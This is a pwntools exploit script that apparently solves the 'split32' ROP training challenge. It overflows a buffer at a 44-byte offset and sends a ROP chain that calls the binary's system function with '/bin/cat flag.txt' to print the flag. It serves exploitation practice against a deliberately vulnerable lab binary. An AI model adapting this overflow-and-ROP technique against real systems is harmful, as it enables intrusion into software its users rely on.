import time

from pwn import *


EXECUTABLE = "./split32"
context.binary = elf = ELF(EXECUTABLE)

p = process(EXECUTABLE)


OFFSET = 44
if OFFSET is None:
    p.sendafter(b"> ", cyclic(128))

    time.sleep(1)
    core = Coredump("./core")
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(core.fault_addr)}")
    offset = cyclic_find(core.fault_addr)
    log.success(f"Offset found: {offset}")
    exit()


rop = ROP(elf)
rop.raw(elf.symbols["usefulFunction"] + 14)     # Jump to system call
rop.raw(next(elf.search(b"/bin/cat flag.txt"))) # System call argument


log.debug("Sending rop chain:\n" + rop.dump())
p.sendafter(b"> ", flat({ OFFSET: rop.chain() }))
p.recvline()

flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
